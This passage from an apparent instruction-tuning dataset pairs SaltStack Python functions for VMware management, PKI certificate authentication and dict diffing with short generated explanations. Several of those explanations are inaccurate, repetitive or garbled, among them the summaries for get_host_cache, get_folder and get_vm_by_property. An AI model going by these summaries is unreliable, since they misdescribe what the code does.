vsan_disk_mappings if\n                   (get_all_disk_groups or\n                    (dm.ssd.canonicalName in cache_disk_ids))]\n    log.trace(\n        'Retrieved disk groups on host \\'%s\\', with cache disk ids : %s',\n        hostname, [d.ssd.canonicalName for d in disk_groups]\n    )\n    return disk_groups"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _check_disks_in_diskgroup(disk_group, cache_disk_id, capacity_disk_ids):\n    '''\n    Checks that the disks in a disk group are as expected and raises\n    CheckError exceptions if the check fails\n    '''\n    if not disk_group.ssd.canonicalName == cache_disk_id:\n        raise salt.exceptions.ArgumentValueError(\n            'Incorrect diskgroup cache disk; got id: \\'{0}\\'; expected id: '\n            '\\'{1}\\''.format(disk_group.ssd.canonicalName, cache_disk_id))\n    non_ssd_disks = [d.canonicalName for d in disk_group.nonSsd]\n    if sorted(non_ssd_disks) != sorted(capacity_disk_ids):\n        raise salt.exceptions.ArgumentValueError(\n            'Incorrect capacity disks; got ids: \\'{0}\\'; expected ids: \\'{1}\\''\n            ''.format(sorted(non_ssd_disks),\n                      sorted(capacity_disk_ids)))\n    log.trace('Checked disks in diskgroup with cache disk id \\'%s\\'',\n              cache_disk_id)\n    return True", "response": "Checks that the disks in a disk group are as expected and raises a CheckError exception if the check fails"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_host_cache(host_ref, host_cache_manager=None):\n    '''\n    Returns a vim.HostScsiDisk if the host cache is configured on the specified\n    host, other wise returns None\n\n    host_ref\n        The vim.HostSystem object representing the host that contains the\n        requested disks.\n\n    host_cache_manager\n        The vim.HostCacheConfigurationManager object representing the cache\n        configuration manager on the specified host. Default is None. If None,\n        it will be retrieved in the method\n    '''\n    hostname = get_managed_object_name(host_ref)\n    service_instance = get_service_instance_from_managed_object(host_ref)\n    log.trace('Retrieving the host cache on host \\'%s\\'', hostname)\n    if not host_cache_manager:\n        traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n            path='configManager.cacheConfigurationManager',\n            type=vim.HostSystem,\n            skip=False)\n        results = get_mors_with_properties(service_instance,\n                                           vim.HostCacheConfigurationManager,\n                                           ['cacheConfigurationInfo'],\n                                           container_ref=host_ref,\n                                           traversal_spec=traversal_spec)\n        if not results or not results[0].get('cacheConfigurationInfo'):\n            log.trace('Host \\'%s\\' has no host cache', hostname)\n            return None\n        return results[0]['cacheConfigurationInfo'][0]\n    else:\n        results = get_properties_of_managed_object(host_cache_manager,\n                                                   ['cacheConfigurationInfo'])\n        if not results:\n            log.trace('Host \\'%s\\' has no host cache', hostname)\n            return None\n        return results['cacheConfigurationInfo'][0]", "response": "Returns a vim. HostScsiDisk object representing the host that contains the requested disks."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconfigure the host cache on the specified host.", "response": "def configure_host_cache(host_ref, datastore_ref, swap_size_MiB,\n                         host_cache_manager=None):\n    '''\n    Configures the host cahe of the specified host\n\n    host_ref\n        The vim.HostSystem object representing the host that contains the\n        requested disks.\n\n    datastore_ref\n        The vim.Datastore opject representing the datastore the host cache will\n        be configured on.\n\n    swap_size_MiB\n        The size in Mibibytes of the swap.\n\n    host_cache_manager\n        The vim.HostCacheConfigurationManager object representing the cache\n        configuration manager on the specified host. Default is None. If None,\n        it will be retrieved in the method\n    '''\n    hostname = get_managed_object_name(host_ref)\n    if not host_cache_manager:\n        props = get_properties_of_managed_object(\n            host_ref, ['configManager.cacheConfigurationManager'])\n        if not props.get('configManager.cacheConfigurationManager'):\n            raise salt.exceptions.VMwareObjectRetrievalError(\n                'Host \\'{0}\\' has no host cache'.format(hostname))\n        host_cache_manager = props['configManager.cacheConfigurationManager']\n    log.trace('Configuring the host cache on host \\'%s\\', datastore \\'%s\\', '\n              'swap size=%s MiB', hostname, datastore_ref.name, swap_size_MiB)\n\n    spec = vim.HostCacheConfigurationSpec(\n        datastore=datastore_ref,\n        swapSize=swap_size_MiB)\n    log.trace('host_cache_spec=%s', spec)\n    try:\n        task = host_cache_manager.ConfigureHostCache_Task(spec)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    wait_for_task(task, hostname, 'HostCacheConfigurationTask')\n    log.trace('Configured host cache on host \\'%s\\'', hostname)\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a list of resource pools that are available in the service instance.", "response": "def get_resource_pools(service_instance, resource_pool_names, datacenter_name=None,\n                       get_all_resource_pools=False):\n    '''\n    Retrieves resource pool objects\n\n    service_instance\n        The service instance object to query the vCenter\n\n    resource_pool_names\n        Resource pool names\n\n    datacenter_name\n        Name of the datacenter where the resource pool is available\n\n    get_all_resource_pools\n        Boolean\n\n    return\n        Resourcepool managed object reference\n    '''\n\n    properties = ['name']\n    if not resource_pool_names:\n        resource_pool_names = []\n    if datacenter_name:\n        container_ref = get_datacenter(service_instance, datacenter_name)\n    else:\n        container_ref = get_root_folder(service_instance)\n\n    resource_pools = get_mors_with_properties(service_instance,\n                                              vim.ResourcePool,\n                                              container_ref=container_ref,\n                                              property_list=properties)\n\n    selected_pools = []\n    for pool in resource_pools:\n        if get_all_resource_pools or (pool['name'] in resource_pool_names):\n            selected_pools.append(pool['object'])\n    if not selected_pools:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'The resource pools with properties '\n            'names={} get_all={} could not be found'.format(selected_pools,\n                                                            get_all_resource_pools))\n\n    return selected_pools"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef wait_for_task(task, instance_name, task_type, sleep_seconds=1, log_level='debug'):\n    '''\n    Waits for a task to be completed.\n\n    task\n        The task to wait for.\n\n    instance_name\n        The name of the ESXi host, vCenter Server, or Virtual Machine that\n        the task is being run on.\n\n    task_type\n        The type of task being performed. Useful information for debugging purposes.\n\n    sleep_seconds\n        The number of seconds to wait before querying the task again.\n        Defaults to ``1`` second.\n\n    log_level\n        The level at which to log task information. Default is ``debug``,\n        but ``info`` is also supported.\n    '''\n    time_counter = 0\n    start_time = time.time()\n    log.trace('task = %s, task_type = %s', task, task.__class__.__name__)\n    try:\n        task_info = task.info\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.FileNotFound as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareFileNotFoundError(exc.msg)\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    while task_info.state == 'running' or task_info.state == 'queued':\n        if time_counter % sleep_seconds == 0:\n            msg = '[ {0} ] Waiting for {1} task to finish [{2} s]'.format(\n                instance_name, task_type, time_counter)\n            if log_level == 'info':\n                log.info(msg)\n            else:\n                log.debug(msg)\n        time.sleep(1.0 - ((time.time() - start_time) % 1.0))\n        time_counter += 1\n        try:\n            task_info = task.info\n        except vim.fault.NoPermission as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(\n                'Not enough permissions. Required privilege: '\n                '{}'.format(exc.privilegeId))\n        except vim.fault.FileNotFound as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareFileNotFoundError(exc.msg)\n        except vim.fault.VimFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(exc.msg)\n        except vmodl.RuntimeFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    if task_info.state == 'success':\n        msg = '[ {0} ] Successfully completed {1} task in {2} seconds'.format(\n            instance_name, task_type, time_counter)\n        if log_level == 'info':\n            log.info(msg)\n        else:\n            log.debug(msg)\n        # task is in a successful state\n        return task_info.result\n    else:\n        # task is in an error state\n        try:\n            raise task_info.error\n        except vim.fault.NoPermission as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(\n                'Not enough permissions. Required privilege: '\n                '{}'.format(exc.privilegeId))\n        except vim.fault.FileNotFound as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareFileNotFoundError(exc.msg)\n        except vim.fault.VimFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(exc.msg)\n        except vmodl.fault.SystemError as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareSystemError(exc.msg)\n        except vmodl.fault.InvalidArgument as exc:\n            log.exception(exc)\n            exc_message = exc.msg\n            if exc.faultMessage:\n                exc_message = '{0} ({1})'.format(exc_message,\n                                                 exc.faultMessage[0].message)\n            raise salt.exceptions.VMwareApiError(exc_message)", "response": "Waits for a task to finish."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_vm_by_property(service_instance, name, datacenter=None, vm_properties=None,\n                       traversal_spec=None, parent_ref=None):\n    '''\n    Get virtual machine properties based on the traversal specs and properties list,\n    returns Virtual Machine object with properties.\n\n    service_instance\n        Service instance object to access vCenter\n\n    name\n        Name of the virtual machine.\n\n    datacenter\n        Datacenter name\n\n    vm_properties\n        List of vm properties.\n\n    traversal_spec\n        Traversal Spec object(s) for searching.\n\n    parent_ref\n        Container Reference object for searching under a given object.\n    '''\n    if datacenter and not parent_ref:\n        parent_ref = salt.utils.vmware.get_datacenter(service_instance, datacenter)\n    if not vm_properties:\n        vm_properties = ['name',\n                         'config.hardware.device',\n                         'summary.storage.committed',\n                         'summary.storage.uncommitted',\n                         'summary.storage.unshared',\n                         'layoutEx.file',\n                         'config.guestFullName',\n                         'config.guestId',\n                         'guest.net',\n                         'config.hardware.memoryMB',\n                         'config.hardware.numCPU',\n                         'config.files.vmPathName',\n                         'summary.runtime.powerState',\n                         'guest.toolsStatus']\n    vm_list = salt.utils.vmware.get_mors_with_properties(service_instance,\n                                                         vim.VirtualMachine,\n                                                         vm_properties,\n                                                         container_ref=parent_ref,\n                                                         traversal_spec=traversal_spec)\n    vm_formatted = [vm for vm in vm_list if vm['name'] == name]\n    if not vm_formatted:\n        raise salt.exceptions.VMwareObjectRetrievalError('The virtual machine was not found.')\n    elif len(vm_formatted) > 1:\n        raise salt.exceptions.VMwareMultipleObjectsError(' '.join([\n            'Multiple virtual machines were found with the'\n            'same name, please specify a container.']))\n    return vm_formatted[0]", "response": "Get virtual machine properties based on the properties list and the properties list."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_folder(service_instance, datacenter, placement, base_vm_name=None):\n    '''\n    Returns a Folder Object\n\n    service_instance\n        Service instance object\n\n    datacenter\n        Name of the datacenter\n\n    placement\n        Placement dictionary\n\n    base_vm_name\n        Existing virtual machine name (for cloning)\n    '''\n    log.trace('Retrieving folder information')\n    if base_vm_name:\n        vm_object = get_vm_by_property(service_instance, base_vm_name, vm_properties=['name'])\n        vm_props = salt.utils.vmware.get_properties_of_managed_object(vm_object, properties=['parent'])\n        if 'parent' in vm_props:\n            folder_object = vm_props['parent']\n        else:\n            raise salt.exceptions.VMwareObjectRetrievalError(' '.join([\n                'The virtual machine parent',\n                'object is not defined']))\n    elif 'folder' in placement:\n        folder_objects = salt.utils.vmware.get_folders(service_instance, [placement['folder']], datacenter)\n        if len(folder_objects) > 1:\n            raise salt.exceptions.VMwareMultipleObjectsError(' '.join([\n                'Multiple instances are available of the',\n                'specified folder {0}'.format(placement['folder'])]))\n        folder_object = folder_objects[0]\n    elif datacenter:\n        datacenter_object = salt.utils.vmware.get_datacenter(service_instance, datacenter)\n        dc_props = salt.utils.vmware.get_properties_of_managed_object(datacenter_object, properties=['vmFolder'])\n        if 'vmFolder' in dc_props:\n            folder_object = dc_props['vmFolder']\n        else:\n            raise salt.exceptions.VMwareObjectRetrievalError('The datacenter vm folder object is not defined')\n    return folder_object", "response": "Returns a Folder Object containing the virtual machine and the virtual machine s virtual machine folders."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a virtual machine with the specified placement information.", "response": "def get_placement(service_instance, datacenter, placement=None):\n    '''\n    To create a virtual machine a resource pool needs to be supplied, we would like to use the strictest as possible.\n\n    datacenter\n        Name of the datacenter\n\n    placement\n        Dictionary with the placement info, cluster, host resource pool name\n\n    return\n        Resource pool, cluster and host object if any applies\n    '''\n    log.trace('Retrieving placement information')\n    resourcepool_object, placement_object = None, None\n    if 'host' in placement:\n        host_objects = get_hosts(service_instance, datacenter_name=datacenter, host_names=[placement['host']])\n        if not host_objects:\n            raise salt.exceptions.VMwareObjectRetrievalError(' '.join([\n                'The specified host',\n                '{0} cannot be found.'.format(placement['host'])]))\n        try:\n            host_props = \\\n                get_properties_of_managed_object(host_objects[0],\n                                                 properties=['resourcePool'])\n            resourcepool_object = host_props['resourcePool']\n        except vmodl.query.InvalidProperty:\n            traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n                path='parent',\n                skip=True,\n                type=vim.HostSystem,\n                selectSet=[vmodl.query.PropertyCollector.TraversalSpec(\n                    path='resourcePool',\n                    skip=False,\n                    type=vim.ClusterComputeResource)])\n            resourcepools = get_mors_with_properties(service_instance,\n                                                     vim.ResourcePool,\n                                                     container_ref=host_objects[0],\n                                                     property_list=['name'],\n                                                     traversal_spec=traversal_spec)\n            if resourcepools:\n                resourcepool_object = resourcepools[0]['object']\n            else:\n                raise salt.exceptions.VMwareObjectRetrievalError(\n                    'The resource pool of host {0} cannot be found.'.format(placement['host']))\n        placement_object = host_objects[0]\n    elif 'resourcepool' in placement:\n        resourcepool_objects = get_resource_pools(service_instance,\n                                                  [placement['resourcepool']],\n                                                  datacenter_name=datacenter)\n        if len(resourcepool_objects) > 1:\n            raise salt.exceptions.VMwareMultipleObjectsError(' '.join([\n                'Multiple instances are available of the',\n                'specified host {}.'.format(placement['host'])]))\n        resourcepool_object = resourcepool_objects[0]\n        res_props = get_properties_of_managed_object(resourcepool_object,\n                                                     properties=['parent'])\n        if 'parent' in res_props:\n            placement_object = res_props['parent']\n        else:\n            raise salt.exceptions.VMwareObjectRetrievalError(' '.join([\n                'The resource pool\\'s parent',\n                'object is not defined']))\n    elif 'cluster' in placement:\n        datacenter_object = get_datacenter(service_instance, datacenter)\n        cluster_object = get_cluster(datacenter_object, placement['cluster'])\n        clus_props = get_properties_of_managed_object(cluster_object,\n                                                      properties=['resourcePool'])\n        if 'resourcePool' in clus_props:\n            resourcepool_object = clus_props['resourcePool']\n        else:\n            raise salt.exceptions.VMwareObjectRetrievalError(' '.join([\n                'The cluster\\'s resource pool',\n                'object is not defined']))\n        placement_object = cluster_object\n    else:\n        # We are checking the schema for this object, this exception should never be raised\n        raise salt.exceptions.VMwareObjectRetrievalError(' '.join([\n            'Placement is not defined.']))\n    return (resourcepool_object, placement_object)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconvert the given size to KB based on the unit returns a long integer.", "response": "def convert_to_kb(unit, size):\n    '''\n    Converts the given size to KB based on the unit, returns a long integer.\n\n    unit\n        Unit of the size eg. GB; Note: to VMware a GB is the same as GiB = 1024MiB\n    size\n        Number which represents the size\n    '''\n    if unit.lower() == 'gb':\n        # vCenter needs long value\n        target_size = int(size * 1024 * 1024)\n    elif unit.lower() == 'mb':\n        target_size = int(size * 1024)\n    elif unit.lower() == 'kb':\n        target_size = int(size)\n    else:\n        raise salt.exceptions.ArgumentValueError('The unit is not specified')\n    return {'size': target_size, 'unit': 'KB'}"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef power_cycle_vm(virtual_machine, action='on'):\n    '''\n    Powers on/off a virtual machine specified by it's name.\n\n    virtual_machine\n        vim.VirtualMachine object to power on/off virtual machine\n\n    action\n        Operation option to power on/off the machine\n    '''\n    if action == 'on':\n        try:\n            task = virtual_machine.PowerOn()\n            task_name = 'power on'\n        except vim.fault.NoPermission as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(\n                'Not enough permissions. Required privilege: '\n                '{}'.format(exc.privilegeId))\n        except vim.fault.VimFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(exc.msg)\n        except vmodl.RuntimeFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    elif action == 'off':\n        try:\n            task = virtual_machine.PowerOff()\n            task_name = 'power off'\n        except vim.fault.NoPermission as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(\n                'Not enough permissions. Required privilege: '\n                '{}'.format(exc.privilegeId))\n        except vim.fault.VimFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(exc.msg)\n        except vmodl.RuntimeFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    else:\n        raise salt.exceptions.ArgumentValueError('The given action is not supported')\n    try:\n        wait_for_task(task, get_managed_object_name(virtual_machine), task_name)\n    except salt.exceptions.VMwareFileNotFoundError as exc:\n        raise salt.exceptions.VMwarePowerOnError(' '.join([\n            'An error occurred during power',\n            'operation, a file was not found: {0}'.format(exc)]))\n    return virtual_machine", "response": "Power cycle a virtual machine."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate virtual machine from config spec", "response": "def create_vm(vm_name, vm_config_spec, folder_object, resourcepool_object, host_object=None):\n    '''\n    Creates virtual machine from config spec\n\n    vm_name\n        Virtual machine name to be created\n\n    vm_config_spec\n        Virtual Machine Config Spec object\n\n    folder_object\n        vm Folder managed object reference\n\n    resourcepool_object\n        Resource pool object where the machine will be created\n\n    host_object\n        Host object where the machine will ne placed (optional)\n\n    return\n        Virtual Machine managed object reference\n    '''\n    try:\n        if host_object and isinstance(host_object, vim.HostSystem):\n            task = folder_object.CreateVM_Task(vm_config_spec,\n                                               pool=resourcepool_object,\n                                               host=host_object)\n        else:\n            task = folder_object.CreateVM_Task(vm_config_spec,\n                                               pool=resourcepool_object)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    vm_object = wait_for_task(task, vm_name, 'CreateVM Task', 10, 'info')\n    return vm_object"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef register_vm(datacenter, name, vmx_path, resourcepool_object, host_object=None):\n    '''\n    Registers a virtual machine to the inventory with the given vmx file, on success\n    it returns the vim.VirtualMachine managed object reference\n\n    datacenter\n        Datacenter object of the virtual machine, vim.Datacenter object\n\n    name\n        Name of the virtual machine\n\n    vmx_path:\n        Full path to the vmx file, datastore name should be included\n\n    resourcepool\n        Placement resource pool of the virtual machine, vim.ResourcePool object\n\n    host\n        Placement host of the virtual machine, vim.HostSystem object\n    '''\n    try:\n        if host_object:\n            task = datacenter.vmFolder.RegisterVM_Task(path=vmx_path, name=name,\n                                                       asTemplate=False,\n                                                       host=host_object,\n                                                       pool=resourcepool_object)\n        else:\n            task = datacenter.vmFolder.RegisterVM_Task(path=vmx_path, name=name,\n                                                       asTemplate=False,\n                                                       pool=resourcepool_object)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    try:\n        vm_ref = wait_for_task(task, name, 'RegisterVM Task')\n    except salt.exceptions.VMwareFileNotFoundError as exc:\n        raise salt.exceptions.VMwareVmRegisterError(\n            'An error occurred during registration operation, the '\n            'configuration file was not found: {0}'.format(exc))\n    return vm_ref", "response": "Registers a virtual machine to the inventory with the given vmx file."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the virtual machine configuration with the given object", "response": "def update_vm(vm_ref, vm_config_spec):\n    '''\n    Updates the virtual machine configuration with the given object\n\n    vm_ref\n        Virtual machine managed object reference\n\n    vm_config_spec\n        Virtual machine config spec object to update\n    '''\n    vm_name = get_managed_object_name(vm_ref)\n    log.trace('Updating vm \\'%s\\'', vm_name)\n    try:\n        task = vm_ref.ReconfigVM_Task(vm_config_spec)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    vm_ref = wait_for_task(task, vm_name, 'ReconfigureVM Task')\n    return vm_ref"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef unregister_vm(vm_ref):\n    '''\n    Destroys the virtual machine\n\n    vm_ref\n        Managed object reference of a virtual machine object\n    '''\n    vm_name = get_managed_object_name(vm_ref)\n    log.trace('Destroying vm \\'%s\\'', vm_name)\n    try:\n        vm_ref.UnregisterVM()\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)", "response": "Destroys the virtual machine object holding the specified virtual machine object reference."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef auth(username, password, **kwargs):\n    '''\n    Returns True if the given user cert (password is the cert contents)\n    was issued by the CA and if cert's Common Name is equal to username.\n\n    Returns False otherwise.\n\n    ``username``: we need it to run the auth function from CLI/API;\n                  it should be in master config auth/acl\n    ``password``: contents of user certificate (pem-encoded user public key);\n                  why \"password\"? For CLI, it's the only available name\n\n    Configure the CA cert in the master config file:\n\n    .. code-block:: yaml\n\n        external_auth:\n          pki:\n            ca_file: /etc/pki/tls/ca_certs/trusted-ca.crt\n            your_user:\n              - .*\n    '''\n    pem = password\n    cacert_file = __salt__['config.get']('external_auth:pki:ca_file')\n\n    log.debug('Attempting to authenticate via pki.')\n    log.debug('Using CA file: %s', cacert_file)\n    log.debug('Certificate contents: %s', pem)\n\n    if HAS_M2:\n        cert = X509.load_cert_string(pem, X509.FORMAT_PEM)\n        cacert = X509.load_cert(cacert_file, X509.FORMAT_PEM)\n        if cert.verify(cacert.get_pubkey()):\n            log.info('Successfully authenticated certificate: %s', pem)\n            return True\n        else:\n            log.info('Failed to authenticate certificate: %s', pem)\n            return False\n\n    c = OpenSSL.crypto\n    cert = c.load_certificate(c.FILETYPE_PEM, pem)\n\n    with salt.utils.files.fopen(cacert_file) as f:\n        cacert = c.load_certificate(c.FILETYPE_PEM, f.read())\n\n    # Get the signing algorithm\n    algo = cert.get_signature_algorithm()\n\n    # Get the ASN1 format of the certificate\n    cert_asn1 = c.dump_certificate(c.FILETYPE_ASN1, cert)\n\n    # Decode the certificate\n    der = asn1.DerSequence()\n    der.decode(cert_asn1)\n\n    # The certificate has three parts:\n    # - certificate\n    # - signature algorithm\n    # - signature\n    # http://usefulfor.com/nothing/2009/06/10/x509-certificate-basics/\n    der_cert = der[0]\n    #der_algo = der[1]\n    der_sig = der[2]\n\n    # The signature is a BIT STRING (Type 3)\n    # Decode that as well\n    der_sig_in = asn1.DerObject()\n    der_sig_in.decode(der_sig)\n\n    # Get the payload\n    sig0 = der_sig_in.payload\n\n    # Do the following to see a validation error for tests\n    # der_cert=der_cert[:20]+'1'+der_cert[21:]\n\n    # First byte is the number of unused bits. This should be 0\n    # http://msdn.microsoft.com/en-us/library/windows/desktop/bb540792(v=vs.85).aspx\n    if sig0[0] != '\\x00':\n        raise Exception('Number of unused bits is strange')\n    # Now get the signature itself\n    sig = sig0[1:]\n\n    # And verify the certificate\n    try:\n        c.verify(cacert, sig, der_cert, algo)\n        assert dict(cert.get_subject().get_components())['CN'] == username, \"Certificate's CN should match the username\"\n        log.info('Successfully authenticated certificate: %s', pem)\n        return True\n    except (OpenSSL.crypto.Error, AssertionError):\n        log.info('Failed to authenticate certificate: %s', pem)\n    return False", "response": "Authenticate the user with the given username and password."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a dict with the differences between dict1 and dict2", "response": "def _get_diffs(cls, dict1, dict2, ignore_missing_keys):\n        '''\n        Returns a dict with the differences between dict1 and dict2\n\n        Notes:\n            Keys that only exist in dict2 are not included in the diff if\n            ignore_missing_keys is True, otherwise they are\n            Simple compares are done on lists\n        '''\n        ret_dict = {}\n        for p in dict1.keys():\n            if p not in dict2:\n                ret_dict.update({p: {'new': dict1[p], 'old': cls.NONE_VALUE}})\n            elif dict1[p] != dict2[p]:\n                if isinstance(dict1[p], dict) and isinstance(dict2[p], dict):\n                    sub_diff_dict = cls._get_diffs(dict1[p], dict2[p],\n                                                   ignore_missing_keys)\n                    if sub_diff_dict:\n                        ret_dict.update({p: sub_diff_dict})\n                else:\n                    ret_dict.update({p: {'new': dict1[p], 'old': dict2[p]}})\n        if not ignore_missing_keys:\n            for p in dict2.keys():\n                if p not in dict1.keys():\n                    ret_dict.update({p: {'new': cls.NONE_VALUE,\n                                         'old': dict2[p]}})\n        return ret_dict"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_values(cls, diff_dict, type='new'):\n        '''\n        Returns a dictionaries with the 'new' values in a diff dict.\n\n        type\n            Which values to return, 'new' or 'old'\n        '''\n        ret_dict = {}\n        for p in diff_dict.keys():\n            if type in diff_dict[p].keys():\n                ret_dict.update({p: diff_dict[p][type]})\n            else:\n                ret_dict.update(\n                    {p: cls._get_values(diff_dict[p], type=type)})\n        return ret_dict", "response": "Returns a dictionary with the new values in a diff dict."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_changes(cls, diff_dict):\n        '''\n        Returns a list of string message with the differences in a diff dict.\n\n        Each inner difference is tabulated two space deeper\n        '''\n        changes_strings = []\n        for p in sorted(diff_dict.keys()):\n            if sorted(diff_dict[p].keys()) == ['new', 'old']:\n                # Some string formatting\n                old_value = diff_dict[p]['old']\n                if diff_dict[p]['old'] == cls.NONE_VALUE:\n                    old_value = 'nothing'\n                elif isinstance(diff_dict[p]['old'], six.string_types):\n                    old_value = '\\'{0}\\''.format(diff_dict[p]['old'])\n                elif isinstance(diff_dict[p]['old'], list):\n                    old_value = '\\'{0}\\''.format(\n                        ', '.join(diff_dict[p]['old']))\n                new_value = diff_dict[p]['new']\n                if diff_dict[p]['new'] == cls.NONE_VALUE:\n                    new_value = 'nothing'\n                elif isinstance(diff_dict[p]['new'], six.string_types):\n                    new_value = '\\'{0}\\''.format(diff_dict[p]['new'])\n                elif isinstance(diff_dict[p]['new'], list):\n                    new_value = '\\'{0}\\''.format(', '.join(diff_dict[p]['new']))\n                changes_strings.append('{0} from {1} to {2}'.format(\n                    p, old_value, new_value))\n            else:\n                sub_changes = cls._get_changes(diff_dict[p])\n                if sub_changes:\n                    changes_strings.append('{0}:'.format(p))\n                    changes_strings.extend(['  {0}'.format(c)\n                                           for c in sub_changes])\n        return changes_strings", "response": "Returns a list of string message with the differences in a diff dict. Each element in the list is a tabulated two space deeper. Each element in the list is a tabulated two space deeper."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns all keys that have been added.", "response": "def added(self):\n        '''\n        Returns all keys that have been added.\n\n        If the keys are in child dictionaries they will be represented with\n        . notation\n        '''\n        def _added(diffs, prefix):\n            keys = []\n            for key in diffs.keys():\n                if isinstance(diffs[key], dict) and 'old' not in diffs[key]:\n                    keys.extend(_added(diffs[key],\n                                       prefix='{0}{1}.'.format(prefix, key)))\n                elif diffs[key]['old'] == self.NONE_VALUE:\n                    if isinstance(diffs[key]['new'], dict):\n                        keys.extend(\n                            _added(diffs[key]['new'],\n                                   prefix='{0}{1}.'.format(prefix, key)))\n                    else:\n                        keys.append('{0}{1}'.format(prefix, key))\n            return keys\n\n        return sorted(_added(self._diffs, prefix=''))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns all keys that have been removed.", "response": "def removed(self):\n        '''\n        Returns all keys that have been removed.\n\n        If the keys are in child dictionaries they will be represented with\n        . notation\n        '''\n        def _removed(diffs, prefix):\n            keys = []\n            for key in diffs.keys():\n                if isinstance(diffs[key], dict) and 'old' not in diffs[key]:\n                    keys.extend(_removed(diffs[key],\n                                       prefix='{0}{1}.'.format(prefix, key)))\n                elif diffs[key]['new'] == self.NONE_VALUE:\n                    keys.append('{0}{1}'.format(prefix, key))\n                elif isinstance(diffs[key]['new'], dict):\n                    keys.extend(\n                        _removed(diffs[key]['new'],\n                                 prefix='{0}{1}.'.format(prefix, key)))\n            return keys\n\n        return sorted(_removed(self._diffs, prefix=''))"}
